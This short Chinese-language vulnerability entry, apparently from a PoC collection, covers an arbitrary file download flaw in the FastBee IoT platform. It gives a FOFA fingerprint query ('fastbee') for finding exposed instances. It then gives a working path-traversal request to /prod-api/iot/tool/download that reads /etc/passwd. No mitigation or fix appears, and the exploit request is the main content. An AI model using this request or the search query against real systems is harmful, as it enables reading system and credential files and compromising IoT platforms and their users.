# 蜂信物联(FastBee)物联网平台download存在任意文件下载漏洞

蜂信物联(FastBee)物联网平台download存在任意文件下载漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa

```javascript
"fastbee"
```

## poc

```javascript
GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
Host:
Accept-Encoding: gzip, deflate, br
```

